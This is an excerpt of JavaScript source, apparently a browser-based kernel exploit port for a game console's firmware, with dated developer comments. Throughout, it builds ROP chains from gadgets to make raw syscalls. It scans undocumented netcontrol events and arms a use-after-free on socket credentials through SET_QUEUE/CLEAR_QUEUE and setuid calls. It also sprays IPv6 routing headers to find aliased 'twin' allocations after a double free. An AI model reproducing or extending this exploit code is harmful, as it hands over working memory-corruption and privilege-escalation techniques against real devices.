...
socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
               sendmsg: 0x1c, recvmsg: 0x1b, dup: 0x29,
              ...
              ioctl: 0x36, mmap: 0x1dd, munmap: 73, jitshm_create: 0x215, kexec: 0x295,
               clock_gettime: 232 };
...
(async function () {
    ...
    try {
        ...
        // ---- fcall2 (C-call primitive) -------------------------------
        // callAddr works for syscall STUBS (they are leaf `.ret` thunks) but
        // NOT for real C functions (SIGSEGV: no bp/tls/stack-frame boot).
        // fcall2 calls a C function with a full SysV frame: ALIGNED rsp,
        // rbp prologue, then the fn; the fn's own ret returns to our chain
        // where LEAVE_RET pops the frame we pushed for it. The fn is entered
        // with `ret target` (like a `call` whose return slot we pre-seed).
        function fcall2(target, args) {
            ...
            const targetIdx = insts.length;
            insts.push(target);                          // [POP_R9]->ret -> fn
            // fn's `ret` (its real SysV epilogue) returns here: housekeeping, then
            // LEAVE_RET hands control back to the JSC frame.
            insts.push(G.POP_RDI_RET); insts.push(M.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            // fn entry (tail `ret` of the last arg gadget lands us at the slot
            // AFTER target) must have rsp%16==8 per SysV. slot(target) = targetIdx,
            // rsp_entry = slot(target)+1 -> require slot(target)%16==0.
            if (((M.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(M.stackDv, at + 8 * i, insts[i]);
        ...
        if (params.get("probe") === "fc2") {
            const F2 = d => mark("FC2", d);
            F2("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            // MANUAL EMULATION of libkernel dmem binder @0x18400 (fcall2 proved
            // C-fns hang from browser ROP -- read the C source instead and do
            // its syscall sequence with stubs directly).
            //
            // 0x18400 (args: rdi=out, rsi=len>=0x4000 & %0x4000==0, rdx=prot,
            //         rcx=flags, r8=extra):
            //   hint = 0x880000000 (or 0x200000000 if the outsized fallback)
            //   m = mmap(hint, len, prot, flags|0x3000, -1, 0)      ; sc#477
            //   if m != -1:
            //     [out] = m
            //     rv = sc#588(m, len, r8_extra)                     ; sc#588
            //     if rv != -1: return 0 else errno
            const u64 = h => new int64(h & 0xffffffff, (h / 0x100000000) >>> 0);
            const PROT_RW = 3, MAP_PRIVATE_ANON = 0x1002;
            const len = u64(0x1000000);
            const MF = d => d === undefined || d === null ||
                (d.lo === 0xffffffff && d.hi === 0xffffffff);
            for (const [nm, hint] of [["0x880000000", u64(0x880000000)],
                                      ["0x200000000", u64(0x200000000)],
                                      ["0 (default)", u64(0)]]) {
                let mm;
                try {
                    mm = sc(SYS.mmap, hint, len, PROT_RW, MAP_PRIVATE_ANON, 0xffffffff, 0);
                } catch (e) {
                    F2("mmap hint=" + nm + " THREW " +
                        ((e && e.message) ? e.message : String(e)));
                    continue;
                }
                const rv = (mm && mm.hi !== undefined) ?
                    "lo=0x" + (mm.lo >>> 0).toString(16) + " hi=" + (mm.hi >>> 0).toString(16) :
                    String(mm);
                F2("mmap(hint=" + nm + ",len=0x1000000,RW,PRIVATE_ANON) rv=" + rv +
                    " err=" + (MF(mm) ? errno() : 0));
            }
        ...
        if (params.get("probe") === "fc2b") {
            // 0x30a00 DISCOVERY: (addr,len,rdx=name,rcx=outw) exactly as the
            // real SceLibcMutexPoolForMonoVM pool-register path. rdx points to
            // the NAME string; rcx is an OUTWORD that the kernel writes the
            // registered address into (0x18400: mov [rcx],rax before call,
            // and sc#588 copies result back out to *rcx). Missing rcx = kill.
            // len is 0x100000 (1MB) in the real init, not 16MB.
            const NAME = "SceLibcMutexPoolForMonoVM";
            const nameAb = new ArrayBuffer(0x40); keepAlive.push(nameAb);
            const nameU8 = new Uint8Array(nameAb); nameU8.fill(0);
            for (let i = 0; i < NAME.length; ++i) nameU8[i] = NAME.charCodeAt(i);
            const nameAddr = bufAddr(nameAb);
            const outAb = new ArrayBuffer(8); keepAlive.push(outAb);
            const outAddr = bufAddr(outAb);
            const F2 = d => mark("FC2B", d);
            F2("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const u64 = h => new int64(h & 0xffffffff, (h / 0x100000000) >>> 0);
            const len = u64(0x100000);
            const MF = d => d === undefined || d === null ||
                (d.lo === 0xffffffff && d.hi === 0xffffffff);
            F2("name @0x" + (nameAddr.hi * 0x100000000 + nameAddr.low).toString(16) +
                " out @0x" + (outAddr.hi * 0x100000000 + outAddr.low).toString(16));
            let m = sc(SYS.mmap, u64(0x880000000), len, 3, 0x1002, 0xffffffff, 0);
            F2("mmap rv lo=0x" + (m.lo >>> 0).toString(16) +
                " hi=" + (m.hi >>> 0).toString(16) +
                (MF(m) ? " err=" + errno() : ""));
            if (!MF(m)) {
                F2("REACHED-588 m=0x" + (m.hi * 0x100000000 + m.lo).toString(16) +
                    " name=" + NAME);
                let r;
                try {
                    if (!stubAddr.has(588)) stubAddr.set(588, libkernelBase.add32(0x1c90));
                    r = sc(588, new int64(m.lo, m.hi), len, nameAddr, outAddr);
                } catch (e) {
                    F2("sc#588 THREW " + ((e && e.message) ? e.message : String(e)));
                    r = null;
                }
                F2("588-DONE rv lo=0x" + (r ? (r.lo >>> 0).toString(16) : "-") +
                    " hi=" + (r ? (r.hi >>> 0).toString(16) : "-") +
                    " out=" + new DataView(outAb).getUint32(0, true).toString(16));
            } else {
                F2("mmap failed; sc#588 skipped");
            }
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }
        if (params.get("probe") === "fc2c") {
            // CONTROL RUN: the SAME ROP engine (stubAddr/sc/callAddr) invoked on
            // SAFE variable-arity syscalls, to separate "engine broken / rcx
            // clobber kills" from "sc#588 is Sony-filtered at uid=1".
            // fc2b already showed mmap (4+ args incl r8=fd=-1) WORKS, so the
            // engine is fine with 3-6 args; this adds explicit rcx/outw so we
            // can later say the sc#588 kill is syscall-specific, not ABI.
            const F3 = d => mark("FC2C", d);
            F3("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const u64 = h => new int64(h & 0xffffffff, (h / 0x100000000) >>> 0);
            const outAb = new ArrayBuffer(8); keepAlive.push(outAb);
            const outAddr = bufAddr(outAb);
            F3("out @0x" + (outAddr.hi * 0x100000000 + outAddr.low).toString(16));
            let r = sc(SYS.getpid, outAddr);
            F3("getpid(outw) rv=" + (r ? r.i32 : -1) + " out=0x" +
                new DataView(outAb).getUint32(0, true).toString(16));
            r = sc(SYS.getuid, u64(0), u64(0), new int64(0, 0), outAddr);
            F3("getuid(5args) rv=" + (r ? r.i32 : -1));
            r = sc(SYS.mmap, u64(0x600000000), u64(0x4000), 3, 0x1002, 0xffffffff, 0, outAddr);
            F3("mmap(7args) rv lo=0x" + (r ? (r.lo >>> 0).toString(16) : "-") +
                " hi=" + (r ? (r.hi >>> 0).toString(16) : "-"));
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }
        ...
        // ?probe=evscan -- SCAN THE NETCONTROL EVENT NAMESPACE (2026-09-14).
        // The reference (Poops.java:28-29, chain_poops.js:79) uses ONLY
        // SET_QUEUE(0x20000003) / CLEAR_QUEUE(0x20000007). But the netevent
        // cmd namespace is Sony's own -- 0x20000000..0x2000003F may contain
        // UNDOCUMENTED events that pin/free a socket+ucred ref differently,
        // e.g. one that frees without requiring setuid(1)x2 (the no-op that
        // kills the whole chain at uid=1 on 13.52). COSTS NAUGHT: each cell is
        // netcontrol(fd, ev, arg=NULL-ish, 0) on a fresh AF_UNIX socket; the
        // sandbox returns -1 for unknown cmds. Any rv==0 is a live unknown.
        if (params.get("probe") === "evscan") {
            const EV = d => mark("EVSCAN", d);
            EV("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const live = [], nulls = [];
            // first arg sweep: -1 (auto slot, the poops default) and 0/1/2
            // (explicit slot/ifindex). Keep sockets fresh per event so a
            // succeeded SET_QUEUE can't double-arm a stale fd.
            const slots = [-1, 0, 1, 2];
            for (let ev = 0x20000000; ev <= 0x2000003f; ++ev) {
                const hits = [];
                for (const sl of slots) {
                    const s = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                    if (s === -1) { EV("socket failed errno=" + errno()); break; }
                    argDv.setUint32(0, s >>> 0, true); argDv.setUint32(4, 0, true);
                    const r = sc(SYS.netcontrol, sl, ev, argAddr, 8).i32;
                    if (r === 0) hits.push("slot" + sl + "=0");
                    else if (errno() === 0) hits.push("slot" + sl + "=err0"); // EINTR-ish
                    sc(SYS.close, s);
                }
                if (hits.length) live.push(hx(ev) + "{" + hits.join(",") + "}");
                else nulls.push(hx(ev));
                if ((ev & 0xf) === 0xf) EV("scanned .." + hx(ev)
                    + " live=" + live.length + " seen rv0 at "
                    + (live.slice(-6).join(" ") || "none"));
            }
            EV("LIVE=" + (live.length ? live.join(" ") : "NONE"));
            // focused re-test of any rv==0 events: does SET free a ucred on a
            // later socket close WITHOUT any setuid? (the poops queue pin)
            if (live.length) {
                for (const tok of live) {
                    const ev = parseInt(tok.slice(0, 10), 16) >>> 0;
                    const s = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                    argDv.setUint32(0, s >>> 0, true); argDv.setUint32(4, 0, true);
                    const r = sc(SYS.netcontrol, -1, ev, argAddr, 8).i32;
                    EV("pin-test " + hx(ev) + " rv=" + r + " err=" + (r === -1 ? errno() : 0));
                    sc(SYS.close, s);
                }
            }
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            state("probe evscan done", "warn");
            rebootRequired = live.length > 0;
            return;
        }

        // ?probe=ev10 -- FOCUSED DISSECTION OF THE SECOND LIVE EVENT 0x20000010
        // (found by evscan 2026-09-14). Two questions per cell:
        //   (a) does the cmd WRITE into arg (kernel leak)?  -- put a marker in
        //       arg, call, read back: changed bytes => data out
        //   (b) does any cmd outside 0x20000003/07/10 come alive on explicit
        //       slots? sweep the low byte neighborhood + other bit groups.
        // Runs on EXPLICIT slot=1 only (slot -1 was exhausted by evscan).
        // MUST run on a FRESH boot (evscan dirtied the slots).
        if (params.get("probe") === "ev10") {
            const E10 = d => mark("EV10", d);
            E10("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32);
            const marker = new Uint32Array([0x11223344, 0xaabbccdd]);
            const CELLS = [];
            for (let lo = 0x08; lo <= 0x1f; ++lo) CELLS.push(0x20000000 | lo);
            for (const g of [0x20010000, 0x20020000, 0x21000000, 0x22000000,
                             0x30000000, 0x60000000])
                for (const lo2 of [0x00, 0x03, 0x07, 0x10]) CELLS.push(g | lo2);
            const live = [];
            for (const ev of CELLS) {
                const s = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (s === -1) { E10("socket failed errno=" + errno()); break; }
                marker[0] = 0x11223344; marker[1] = 0xaabbccdd;
                argDv.setUint32(0, s >>> 0, true); argDv.setUint32(4, 0, true);
                const r = sc(SYS.netcontrol, 1, ev, argAddr, 8).i32;
                const a0 = argDv.getUint32(0, true), a1 = argDv.getUint32(4, true);
                const wrote = (a0 !== (s >>> 0)) || (a1 !== 0);
                E10(hx(ev) + " rv=" + r + " err=" + (r === -1 ? errno() : 0)
                    + (wrote ? " ARG-WROTE arg=" + hx(a0) + ":" + hx(a1) : ""));
                if (r === 0) live.push(hx(ev) + (wrote ? "!w" : ""));
                else if (s > 0) { /* keep fd for later reuse? no -- close */ }
                sc(SYS.close, s);
            }
            E10("LIVE=" + (live.length ? live.join(" ") : "NONE"));
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            state("probe ev10 done", "warn");
            rebootRequired = live.length > 0;
            return;
        }
        ...
        if (params.get("probe") === "sb588") {
            ...
            //    fd into a state where mmap succeeds (EPERM normally)?
            {
                try {
                    ...
                    S8("G vbo(0)=" + v1 + " err=" + (v1 === -1 ? errno() : 0));
                    const v2 = sc(SYS.ioctl, fdG, 0x2000800b, mmGU, 0, 0, 0).i32;
                    S8("G vbo(anon)=  " + v2 + " err=" + (v2 === -1 ? errno() : 0));
                    ...
                    S8("G THREW: " + ((gErr && gErr.message) ? gErr.message : String(gErr)));
                }
            }
...
// Phase 2: PATCH-GAP. Even without root, if Sony hardened ONLY the
        ...
        function findTwins(timeout) {
            let diagSetOk = 0, diagSetFail = 0, diagGetOk = 0, diagGetNoMatch = 0;
            for (let round = 0; round < timeout; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    ...
                    const sr = setRthdr(ipv6[i]);
                    sprayOk[i] = sr === 0;
                    if (sr === 0) diagSetOk++; else diagSetFail++;
                }
                for (let i = 0; i < ipv6.length; ++i) {
                    ...
                    if (t.ok) diagGetOk++; else diagGetNoMatch++;
                }

                if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
            }
            mark("TWINS-DIAGNOSTIC", "rounds=" + timeout + " setRthdr ok="
                + diagSetOk + " fail=" + diagSetFail + " taggedReads=" + diagGetOk
                + " opaq=" + ((sprayOk.filter ? sprayOk.filter(x => x) : []).length)
                + "/*");
            return null;
        }
        ...
        // ?probe=verbatim -- BYTE-EXACT REPLICA OF chain_poops.js:840-880 (the
        // 13.00-working browser reference), NONE of our port substitutions:
        //   * netcontrol(-1,...) auto slot, no slot-1 fallback
        //   * setuid(1)x2 unconditionally (no CRED variant)
        //   * sendmsg(0, msgAddr, 0) x0x80 on fd 0 (reference takes fd0=socket
        //     for granted; our port replaced it with spraySockpair -- that
        //     substitution itself may be the bug the 2x2 matrix mis-attributed
        //     to "13.52 hardened setuid")
        //   * dup/close then findTwins
        // Decisive: twins!=null proves OUR PORT (not the firmware) broke the
        // browser chain. twins==null on a FRESH boot proves 13.52 genuinely
        // hardened the arming path.
        if (params.get("probe") === "verbatim") {
            const VB = d => mark("VB", d);
            VB("start pid=" + sc(SYS.getpid).i32 + " uid=" + sc(SYS.getuid).i32
                + " fd0IsSocket=" + fd0IsSocket);
            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (dummy === -1) { VB("socket failed"); return; }
            VB("dummy fd=" + dummy);
            const reg = netevent(dummy, NETEVENT_SET_QUEUE);
            VB("SET_QUEUE rv=" + reg.rv + " err=" + reg.err);
            if (reg.rv === -1) {
                VB("ABORT SET rv=-1 (slot not free on this boot)");
                sc(SYS.close, dummy);
                mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
                return;
            }
            sc(SYS.close, dummy);
            const su1 = sc(SYS.setuid, 1).i32;
            VB("setuid(1)#1 rv=" + su1 + " err=" + (su1 === -1 ? errno() : 0));
            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            VB("uafSock=" + uafSock + " reclaim=" + (uafSock === dummy ? "YES" : "NO"));
            if (uafSock !== dummy) {
                VB("ABORT fd not reclaimed");
            ...
            const su2 = sc(SYS.setuid, 1).i32;
            VB("setuid(1)#2 rv=" + su2 + " err=" + (su2 === -1 ? errno() : 0));
            const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
            VB("CLEAR rv=" + clr.rv + " err=" + clr.err);
            VB("UAF-ARMED fd=" + uafSock);
            // Reference env (13.00 working): the reclaim spray is
            // sendmsg(iovSs[0], msgAddr, 0) -- fd0 was 0 ONLY because the first
            // socketpair landed on 0/1 there (stdio fds closed in that webview).
            // iovSs[0] is a real CONNECTED AF_UNIX socketpair end. Our renderer
            // has fd0 taken by a non-socket (close(0)=-1, proved live), but
            // iovSs[0] is the SAME kind of connected socket the reference uses
            // for reclaim AND for the later parked recvmsg workers (fireW at
            // chain_poops.js:898). So spray on iovSs[0] -- that is the exact
            // reference mechanism, not an fd0-specific quirk.
            const sprayFd = iovSs[0];
            VB("spray fd=" + sprayFd + " (iovSs[0]) iov_pair=" + iovSs.join("/")
                + " fd0IsSocket=" + fd0IsSocket);
            const sotAb = new ArrayBuffer(16), sotDv = new DataView(sotAb);
            VB("DIAG A sotAb len=" + sotAb.byteLength + " keepAliveLen=" + keepAlive.length);
            try { keepAlive.push(sotAb); VB("DIAG B pushed"); }
            catch (e) { VB("DIAG B THREW: " + (e && e.message)); throw e; }
            try { new Uint8Array(sotAb).fill(0); VB("DIAG C zeroed"); }
            catch (e) { VB("DIAG C THREW: " + (e && e.message)); throw e; }
            let sotAddr = null;
            try { sotAddr = bufAddr(sotAb); VB("DIAG D sotAddr=" + sotAddr); }
            catch (e) { VB("DIAG D FAILED: " + (e && e.message)); throw e; }
            let g0v = -1;
            try { g0v = sc(SYS.getsockopt, sprayFd, 0xffff, 0x3,
                sotAddr.add32(8), sotAddr).i32; VB("DIAG E g0v=" + g0v); }
            catch (e) { VB("DIAG E THREW: " + (e && e.message)); throw e; }
            VB("spray SO_TYPE rv=" + g0v + " err=" + (g0v === -1 ? errno() : 0)
                + " type=" + sotDv.getUint32(8, true) + " (expect 1=STREAM)");
            VB("DIAG post-SO_TYPE msgAddr=" + msgAddr);
            let e0 = -1;
            try { e0 = sc(SYS.sendmsg, sprayFd, msgAddr, 0).i32; }
            catch (e) { VB("DIAG sendmsg#0 THREW: " + (e && e.message)); throw e; }
            VB("sendmsg#0 rv=" + e0 + " errno=" + (e0 === -1 ? ename(errno()) + "(" + errno() + ")" : "0"));
            ...
            VB("SPRAY fd=" + sprayFd + " first=" + sprayFirst + " fail=" + sprayFail + "/0x80");
            ...
            sc(SYS.close, d1);
            VB("DOUBLE-FREE dup=" + d1 + " closed");
            twins = findTwins(MAX_ROUNDS_TWIN);
            VB("TWIN-SCAN result=" + (twins
                ? "TWINS a=" + twins.a + " b=" + twins.b + " round=" + twins.round
                : "NULL (no alias)"));
            if (twins) {
                freeRthdr(twins.b);
                mark("VB-TWINS-COMMIT", "freed b=" + twins.b
                    + " a=" + twins.a + " round=" + twins.round);
            }
            if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
            rebootRequired = true;
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            state("probe verbatim done", "warn");
            return;
        }
        ...
        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
            ...
            sc(SYS.close, dummy);
            // NOSETUID (2026-09-14): the LIVE 2x2 matrix (probe=mu, 2026-09-11)
            // proved that at uid=1 setuid(1) is a no-op free-killer -- WITH
            // setuid(1)x2, CLEAR_QUEUE does NOT free the netevent slot; WITHOUT
            // it, CLEAR_QUEUE DOES free. Poopsploit includes setuid(1) only
            // because BD-J starts at uid 0 (real 0->1 swap). raw-game.com's
            // browser port (11.50-13.00) reaches twins WITHOUT a working swap.
            // So on uid=1 the productive arm is the PURE fd-reuse path: SET ->
            // close -> socket(fd reuse) -> CLEAR, no setuid at all.
            // CRED-VARIANTS (2026-09-14): ?nosetuid=1 = no cred op; default =
            // setuid(1) (matrix-proven free-killer at uid=1); ?cred=reuid =
            // setreuid(1,1) -- the ONE setuid-family member never probed in the
            // 2x2. On FreeBSD setreuid(ruid,euid) with ruid==euid==curuid may
            // still force a fresh ucred allocation (Sony fork unknown); probing
            // it is the only remaining cred-swap vector not ruled out by the
            // patch-gap sweep (2026-09-12). ?cred=regid uses setregid(1,1)
            // (matrix: no-op, but kept for completeness).
            const CRED = params.get("cred") || (params.get("nosetuid") === "1" ? "none" : "setuid");
            if (CRED === "setuid") {
                const su1 = sc(SYS.setuid, 1).i32;
                ...
                if (r1 === -1) { mark("ATTEMPT-SKIP", "setreuid(1,1) #1 failed errno="
                    + errno()); continue; }
                mark("CRED-REUID", "using setreuid(1,1) as cred-swap");
            } else if (CRED === "regid") {
                const g1 = sc(SYS.setregid, 1, 1).i32;
                if (g1 === -1) { mark("ATTEMPT-SKIP", "setregid(1,1) #1 failed errno="
                    + errno()); continue; }
                mark("CRED-REGID", "using setregid(1,1) as cred-swap");
            } else {
                mark("NOSETUID", "slot fd-reuse armed WITHOUT cred op (uid=1 pure path)");
            }
            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (uafSock !== dummy) {
            ...
            if (CRED === "setuid") {
                ...
                if (r2 === -1) { mark("ATTEMPT-SKIP", "setreuid(1,1) #2 failed errno="
                    + errno()); continue; }
            } else if (CRED === "regid") {
                const g2 = sc(SYS.setregid, 1, 1).i32;
                if (g2 === -1) { mark("ATTEMPT-SKIP", "setregid(1,1) #2 failed errno="
                    + errno()); continue; }
            }
...
// Poops.java:740-749 -- "Set cr_refcnt back to 1." Original
                // reclaimed the freed ucred chunk with FOUR iov worker threads
                // parked in recvmsg(iovSs0, msg, 0) (iov_base=1 => cr_refcnt),
                // signalled via iovSs1, 32 rounds. Our sb588 port had replaced
                // this with a sendmsg flood (wrong -- sendmsg never blocks
                // in the same uio/iov size-class allocation). This is the real
                // pre-double-free reclaim loop.
                const fireParked = function (w) {
                ...
                for (let r = 0; r < 32; ++r) {
                    ...
                    for (let k = 0; k < iovWorkers.length; ++k)
                        tasks[k] = fireParked(iovWorkers[k]);
                    sc(SYS.sched_yield);
                    if (parkedSeen < 0) {
                        await new Promise(res => setTimeout(res, 0));
                        parkedSeen = tasks.filter(t => !t.settled).length;
                        mark("IOV-RECLAIM-PARKED", parkedSeen + "/" + iovWorkers.length);
                    }
                    for (let k = 0; k < iovWorkers.length; ++k)
                ...
                mark("IOV-RECLAIM-PRE", "done 32x n=" + iovWorkers.length
                    + " parked=" + parkedSeen + "/" + iovWorkers.length);
            }
